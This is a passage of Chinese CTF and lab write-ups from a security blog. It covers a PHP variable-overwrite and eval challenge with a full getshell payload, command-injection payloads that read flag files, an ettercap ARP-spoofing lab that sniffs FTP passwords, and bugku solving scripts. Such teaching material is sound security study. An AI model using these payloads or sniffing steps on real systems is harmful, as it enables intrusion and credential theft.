                            $temp_array[$key2] = str_replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'\"'</span>, str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"\'"</span>, (trim($value2))));
                        &#125;
                    &#125;
                    $&#123;$key&#125; = $_GET[$key] = $temp_array;
                &#125; <span class="hljs-keyword">else</span> &#123;
                    <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'mysql_real_escape_string'</span>)) &#123;
                        $&#123;$key&#125; = fuxkSQL(trim($value));
                    &#125; <span class="hljs-keyword">else</span> &#123;
                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'\"'</span>, str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"\'"</span>, (trim($value))));
                    &#125;
                &#125;
            &#125;
        &#125;
    &#125;
&#125;
getVars();
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($source)) &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;
<span class="hljs-comment">//只有admin才能设置环境变量</span>
<span class="hljs-keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'you can set config variables!!'</span> . <span class="hljs-string">'&lt;/br&gt;'</span>;
    <span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;
        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="hljs-number">12</span>) &#123;
            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$$key"</span> . <span class="hljs-string">'="'</span> . $GLOBALS[$key] . <span class="hljs-string">'";'</span>);
        &#125;
    &#125;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;
        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;
            <span class="hljs-keyword">echo</span> ($GLOBALS[$key]) . <span class="hljs-string">'&lt;/br&gt;'</span>;
        &#125;
    &#125;
&#125;</code></pre></div>

<p>代码很长，但是很容易理解 </p>
<p>fuxkSQL是将可能存在sql注入的符号转义</p>
<p>getvarh是将传的参数赋值</p>
<p>global ${$key};这里存在两个$$，所以可能存在变量覆盖</p>
<p>if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) </p>
<p>$password的md5值与adminPassword,这里可以利用变量覆盖绕过</p>
<p>password=111&amp;adminPassword=md(111)</p>
<p>sha1($verif)==$verif弱类型比较，也很容易绕过</p>
<p>sha1($a)=0exxx</p>
<p>只要找出0e开头的字符串的sha1值为0e开头</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">for</span> ($i5 = <span class="hljs-number">0</span>; $i5 &lt;= <span class="hljs-number">9999999999</span>; $i5++) &#123;
    $res = <span class="hljs-string">'0e'</span> . $i5;
    <span class="hljs-comment">//0e1290633704</span>
    <span class="hljs-keyword">if</span> ($res == hash(<span class="hljs-string">'sha1'</span>, $res)) &#123;
        print_r($res);
    &#125;
&#125;</code></pre></div>

<p>所以verif=0e1290633704</p>
<p>重点在这</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;
        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="hljs-number">12</span>) &#123;
            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$$key"</span> . <span class="hljs-string">'="'</span> . $GLOBALS[$key] . <span class="hljs-string">'";'</span>);
        &#125;
    &#125;</code></pre></div>

<ul>
<li>这段是将设置var开头，后面带1到2个数字变量的值，类似于var1=xxx或者var12=xxx 这样的</li>
<li>由于变量覆盖的环节限制了单双引号的输入，所以这里的解法为利用php复杂变量getshell</li>
</ul>
<p>什么是php复杂变量getshell</p>
<p>PHP复杂变量</p>
<p>{}不能被转移，其包裹的部分可当作变量<br>就是${phpinfo()}和{${phpinfo()}}是一样的，花括号{}只是用于区别变量边界的标识符</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs dts">?source=<span class="hljs-number">1</span><span class="hljs-variable">&amp;</span>adminPassword=c4ca4238a0b923820dcc509a6f75849b<span class="hljs-variable">&amp;password</span>=<span class="hljs-number">1</span><span class="hljs-variable">&amp;verif</span>=<span class="hljs-number">0e1290633704</span><span class="hljs-variable">&amp;var1</span>=&#123;$_GET[<span class="hljs-number">1</span>]&#125;<span class="hljs-variable">&amp;var3</span>=$&#123;$var1()&#125;<span class="hljs-variable">&amp;1</span>=phpinfo
<span class="hljs-comment">//var1=&#123;phpinfo&#125;  </span>
<span class="hljs-comment">//var3=$&#123;$var1&#125;=$&#123;phpinfo&#125;</span></code></pre></div>

<p>flag藏在phpinfo中，ctrl+f搜素flag即可</p>
<h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-comment">// flag在flag.php</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>]))&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/\(.*\)/'</span>, $_GET[<span class="hljs-string">'a'</span>]))
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker!!!'</span>);
        ob_start(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($data)</span></span>&#123;
                 <span class="hljs-keyword">if</span> (strpos($data, <span class="hljs-string">'flag'</span>) !== <span class="hljs-keyword">false</span>)
                 <span class="hljs-keyword">return</span> <span class="hljs-string">'ByeBye hacker'</span>;
                 <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
                 &#125;);
        <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);
    &#125; <span class="hljs-keyword">else</span> &#123;
        highlight_file(<span class="hljs-keyword">__FILE__</span>);
    &#125;
    <span class="hljs-meta">?&gt;</span></code></pre></div>

<p>看下代码</p>
<blockquote>
<p>1.get 提交一个参数a</p>
<p>2.正则过滤，a中不能包含（）</p>
<p>3.function($data)，这个函数过滤了flag字段，所以行业不能包含flag</p>
<p>4.绕过上面两个后就可以执行eval()</p>
</blockquote>
<p>可以使用echo配合``绕过上面的检测</p>
<div class="hljs"><pre><code class="hljs autohotkey">echo `base64 f*`;</code></pre></div>

<p>但是一般想到的应该是</p>
<div class="hljs"><pre><code class="hljs abnf">system(<span class="hljs-string">"cat /flag.php"</span>)<span class="hljs-comment">;</span></code></pre></div>

<p>可以利用%0a绕过，%0a对应的ascii码为换行符，并且为base64格式显示，不然会被拦截</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=system(<span class="hljs-string">"%0acat /f*|%20base64"</span>)<span class="hljs-comment">;</span></code></pre></div>



]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>arp attack</title>
    <url>/2020/11/27/attack/</url>
    <content><![CDATA[<h1 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h1><p>ARP（Address Resolution Protocol，地址解析协议是一个位于<a href="https://baike.baidu.com/item/TCP%2FIP协议" target="_blank" rel="noopener">TCP/IP协议</a>栈中的网络层，负责将某个<a href="https://baike.baidu.com/item/IP地址" target="_blank" rel="noopener">IP地址</a>解析成对应的<a href="https://baike.baidu.com/item/MAC地址" target="_blank" rel="noopener">MAC地址</a>。</p>
<a id="more"></a>

<p>ARP 病毒攻击是<a href="https://baike.baidu.com/item/局域网/98626" target="_blank" rel="noopener">局域网</a>最常见的一种攻击方式。由于TCP/IP协议存在的一些漏洞给ARP病毒有进行欺骗攻击的机会，ARP利用TCP/IP协议的漏洞进行欺骗攻击，现已严重影响到人们正常<a href="https://baike.baidu.com/item/上网/217407" target="_blank" rel="noopener">上网</a>和<a href="https://baike.baidu.com/item/通信/300982" target="_blank" rel="noopener">通信</a>安全。当局域网内的计算机遭到ARP的攻击时，它就会持续地向局域网内所有的计算机及网络通信设备发送大量的ARP欺骗数据包，如果不及时处理，便会造成网络通道阻塞、网络设备的承载过重、网络的通讯质量不佳等情况。</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>ARP攻击主要是通过伪造IP地址和MAC地址进行欺骗。使以太网数据包的源地址、目标地址和ARP通信数量剧增导致网络中断或中间人攻击。ARP攻击主要存在于局域网中。若其中一台计算机感染ARP病毒。就会试图通过ARP欺骗截获局域网内其他计算机的信息，造成局域网内的计算机通信故障。</p>
<h2 id="实验机器"><a href="#实验机器" class="headerlink" title="实验机器"></a>实验机器</h2><p>2003虚拟机，作为ftp服务器</p>
<p>xp虚拟机作为用户访问ftp服务</p>
<p>kali作为攻击方，获取xp登录时的账号密码</p>
<p>xp:10.1.1.3/24</p>
<p>2003:10.1.1.1/24</p>
<p>kali:10.1.1.2/24</p>
<h2 id="实验拓扑图"><a href="#实验拓扑图" class="headerlink" title="实验拓扑图"></a>实验拓扑图</h2><p><img src="https://i.loli.net/2020/11/27/BCE6m9cM5pzrFhL.png" srcset="/img/loading.gif" alt="1.png"></p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-检查三台主机的通信情况"><a href="#一-检查三台主机的通信情况" class="headerlink" title="一.检查三台主机的通信情况"></a>一.检查三台主机的通信情况</h3><p>三台主机通信正常</p>
<h3 id="二-2003开启ftp服务器"><a href="#二-2003开启ftp服务器" class="headerlink" title="二.2003开启ftp服务器"></a>二.2003开启ftp服务器</h3><p>开启ftp服务，并设置禁止匿名访问</p>
<p>并创建xp访问时需要的使用的账号</p>
<div class="hljs"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>aaa

<span class="hljs-symbol">password:</span><span class="hljs-number">123.</span><span class="hljs-keyword">com</span></code></pre></div>

<p>验证是可以正常访问的</p>
<h3 id="三-kali打开攻击软件"><a href="#三-kali打开攻击软件" class="headerlink" title="三.kali打开攻击软件"></a>三.kali打开攻击软件</h3><p>打开ettercap-&gt;undefined sniffing-&gt;eth0-&gt;Host-&gt;scan host-&gt;add-&gt;arp posioning-&gt;选择第一项</p>
<p>扫描到两台目标主机，开始arp投毒</p>
<p><img src="https://i.loli.net/2020/11/27/Xos23uSIPQxkiqT.png" srcset="/img/loading.gif" alt="arp-2.png"></p>
<p>此时arp攻击已经开始了</p>
<p>可以看到两个不同的IP对应的确实同一mac地址，当自己的电脑出现这种情况时就可以判断是arp攻击了</p>
<h3 id="四-xp访问ftp服务器，kali抓取到账号密码"><a href="#四-xp访问ftp服务器，kali抓取到账号密码" class="headerlink" title="四.xp访问ftp服务器，kali抓取到账号密码"></a>四.xp访问ftp服务器，kali抓取到账号密码</h3><p>开始第四步</p>
<p>xp访问ftp并输入账号密码</p>
<p>kali那边已经抓取到</p>
<p><img src="https://i.loli.net/2020/11/27/CuI1ovGWZz9tEUp.png" srcset="/img/loading.gif" alt="arp-3.png"></p>
<h2 id="实验结束"><a href="#实验结束" class="headerlink" title="实验结束"></a>实验结束</h2><p>arp攻击的另外一种形式是利用ARP欺骗，造成局域网内主机通信的失败，就是无法连接网络。实现方法比较简单就不再赘述。</p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>arp</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-LFI</title>
    <url>/2020/10/08/buuoj-LFI/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku刷题记录2</title>
    <url>/2020/09/10/bugku1/</url>
    <content><![CDATA[<h1 id="bugku刷题记录2"><a href="#bugku刷题记录2" class="headerlink" title="bugku刷题记录2"></a>bugku刷题记录2</h1><a id="more"></a>





<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开页面查看源码什么也没有</p>
<p>抓包看了看，惊喜的发现了flag字段</p>
<p><img src="https://i.loli.net/2020/11/30/K7zFInPiQEkjvY6.png" srcset="/img/loading.gif" alt></p>
<p>一段base64 解码后为<code>NDQyMDIy</code></p>
<p>提交发现并不对。。。看来另有玄机</p>
<p>多go几次后发现了flag值一直在变，并且有一段提示</p>
<p><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;</code></p>
<p>用post方法提交你所发现的内容，只好使用脚本（不会写）</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> base64
url=<span class="hljs-string">"http://120.24.86.145:8002/web6/"</span>
r=requests.session()
headers=r.get(url).headers<span class="hljs-comment">#因为flag在消息头里</span>
 
mid=base64.b64decode(headers[<span class="hljs-string">'flag'</span>])
mid=mid.decode()<span class="hljs-comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span>
 
flag = base64.b64decode(mid.split(<span class="hljs-string">':'</span>)[<span class="hljs-number">1</span>])<span class="hljs-comment">#获得flag:后的值</span>
data=&#123;<span class="hljs-string">'margin'</span>:flag&#125;
<span class="hljs-keyword">print</span> (r.post(url,data).text)<span class="hljs-comment">#post方法传上去</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/30/7ydLFG96krwuQDn.png" srcset="/img/loading.gif" alt="headers.png"></p>
<h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>注意观察url<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p>
<p>line=2&amp;filename=a2V5cy50eHQ=</p>
<p><code>a2V5cy50eHQ=</code> 解密是为key.txt   line是行的意思，这里应该是查看key.txt的第line行的代码</p>
<p>这里可以查看<code>index.php</code>源码  index.php的base64值为<code>aW5kZXgucGhw</code></p>
<p><img src="https://i.loli.net/2020/11/30/k7VDufCye3x4WAE.png" srcset="/img/loading.gif" alt="cookie1.png"></p>
<p>改变line的值可以一行一行的查看源码，可以使用脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url1 = <span class="hljs-string">"http://123.206.87.240:8002/web11/index.php?line="</span>
url2 = <span class="hljs-string">"&amp;filename=aW5kZXgucGhw"</span>
mysession = requests.session()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">40</span>):    
    r = mysession.get(url1+str(i)+url2)    
print(r.text)</code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

error_reporting(<span class="hljs-number">0</span>);

$file=base64_decode(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'filename'</span>])?$_GET[<span class="hljs-string">'filename'</span>]:<span class="hljs-string">""</span>);

$line=<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'line'</span>])?intval($_GET[<span class="hljs-string">'line'</span>]):<span class="hljs-number">0</span>;

<span class="hljs-keyword">if</span>($file==<span class="hljs-string">''</span>) header(<span class="hljs-string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);

$file_list = <span class="hljs-keyword">array</span>(

<span class="hljs-string">'0'</span> =&gt;<span class="hljs-string">'keys.txt'</span>,

<span class="hljs-string">'1'</span> =&gt;<span class="hljs-string">'index.php'</span>,

);

 

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="hljs-string">'margin'</span>]==<span class="hljs-string">'margin'</span>)&#123;       <span class="hljs-comment">//看这里</span>

$file_list[<span class="hljs-number">2</span>]=<span class="hljs-string">'keys.php'</span>;

&#125;

 

<span class="hljs-keyword">if</span>(in_array($file, $file_list))&#123;

$fa = file($file);

<span class="hljs-keyword">echo</span> $fa[$line];

&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>



<p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p>
<p> 这里可以判断cookie必须满足margin=margin才能访问keys.php</p>
<p><img src="https://i.loli.net/2020/11/30/5c9Ip8Rgn2xL4iS.png" srcset="/img/loading.gif" alt="bp"></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码提示了</p>
<p><code>&lt;!--1p.html--&gt;</code>     </p>
<p>直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64</p>
<div class="hljs"><pre><code class="hljs gcode">JTIyJT<span class="hljs-symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="hljs-attr">VCJTI3</span>aWQlMjcl<span class="hljs-symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="hljs-number">2</span><span class="hljs-symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="hljs-name">M0</span>IlMEEl<span class="hljs-symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="hljs-symbol">NF9</span>HRVQl<span class="hljs-symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGElM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YSUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGIlM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YiUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="hljs-number">4</span>c<span class="hljs-number">3</span>RyaXB<span class="hljs-attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="hljs-number">5</span>JTI<span class="hljs-number">5</span>JTBBJTdCJTBBJTA<span class="hljs-number">5</span>ZW<span class="hljs-symbol">NobyUyMCUyN25</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTI<span class="hljs-number">3</span>JT<span class="hljs-symbol">NCJTBBJTA5</span>cmV<span class="hljs-number">0</span>dXJuJTIwJT<span class="hljs-symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="hljs-number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="hljs-number">2</span>dldF<span class="hljs-number">9</span>jb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>cyUyOCUy<span class="hljs-symbol">NGElMkMlMjdyJTI3</span>JTI<span class="hljs-number">5</span>JT<span class="hljs-symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="hljs-symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="hljs-number">5</span>kJTIwJTI<span class="hljs-number">0</span>aWQl<span class="hljs-name">M0</span>Ql<span class="hljs-name">M0</span>QwJTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>RybGVuJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="hljs-symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="hljs-number">0</span>JTIyJTI<span class="hljs-number">5</span>JTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>Vic<span class="hljs-number">3</span>RyJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyQzAlMkMxJTI<span class="hljs-number">5</span>JTIxJT<span class="hljs-symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="hljs-symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="hljs-number">3</span>RCUwQW<span class="hljs-attr">Vsc2</span>UlMEEl<span class="hljs-symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="hljs-name">m5</span>ldmVyJTIwbmV<span class="hljs-number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="hljs-number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="hljs-number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</code></pre></div>

<p>base64解码后为url编码</p>
<div class="hljs"><pre><code class="hljs angelscript">%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bif%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>header%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>Location%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>hello.php%<span class="hljs-number">3</span>Fid%<span class="hljs-number">3</span>D1%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>exit%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>a%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>a%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>b%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>b%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>stripos%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27.</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>echo%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span><span class="hljs-keyword">return</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>data%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-symbol">20@</span>file_get_contents%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27</span>r%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>data%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>bugku%<span class="hljs-number">20</span><span class="hljs-keyword">is</span>%<span class="hljs-number">20</span>a%<span class="hljs-number">20</span>nice%<span class="hljs-number">20</span>plateform%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D0%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>strlen%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">3E5</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>eregi%<span class="hljs-number">28</span>%<span class="hljs-number">22111</span>%<span class="hljs-number">22.</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">221114</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>D4%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>require%<span class="hljs-number">28</span>%<span class="hljs-number">22f</span>4l2a3g.txt%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>Aelse%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>print%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>give%<span class="hljs-number">20</span>up%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E</code></pre></div>

<p>url解码为源码</p>
<p><img src="https://i.loli.net/2020/11/30/qpmSYCjHZGeRD8F.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
f(!$_GET[<span class="hljs-string">'id'</span>])
&#123;
	header(<span class="hljs-string">'Location: hello.php?id=1'</span>);
	<span class="hljs-keyword">exit</span>();
&#125;
$id=$_GET[<span class="hljs-string">'id'</span>];
$a=$_GET[<span class="hljs-string">'a'</span>];
$b=$_GET[<span class="hljs-string">'b'</span>];
<span class="hljs-keyword">if</span>(stripos($a,<span class="hljs-string">'.'</span>))
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'no no no no no no no'</span>;
	<span class="hljs-keyword">return</span> ;
&#125;
$data = @file_get_contents($a,<span class="hljs-string">'r'</span>);
<span class="hljs-keyword">if</span>($data==<span class="hljs-string">"bugku is a nice plateform!"</span> <span class="hljs-keyword">and</span> $id==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen($b)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">"111"</span>.substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">"1114"</span>) <span class="hljs-keyword">and</span> substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)
&#123;
	<span class="hljs-keyword">require</span>(<span class="hljs-string">"f4l2a3g.txt"</span>); <span class="hljs-comment">//注意这里，flag应该藏在这里</span>
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">print</span> <span class="hljs-string">"never never never give up !!!"</span>;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>果然藏在f4l2a3g.txt</p>
<p><img src="https://i.loli.net/2020/11/30/ObAgHyeFnp9QM1G.png" srcset="/img/loading.gif" alt></p>
<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>此站没有flag，flag被人删了，不用再做了。–一个做题的路人</p>
<p>flag好像真的被删了，列不出来目录，查看wp也没有复现。</p>
<h2 id="正则？字符？"><a href="#正则？字符？" class="headerlink" title="正则？字符？"></a>正则？字符？</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
highlight_file(<span class="hljs-string">'2.php'</span>);
$key=<span class="hljs-string">'KEY&#123;********************************&#125;'</span>;
$IM= preg_match(<span class="hljs-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="hljs-string">"id"</span>]), $match);
<span class="hljs-keyword">if</span>( $IM )&#123; 
 <span class="hljs-keyword">die</span>(<span class="hljs-string">'key is: '</span>.$key);
&#125;</code></pre></div>



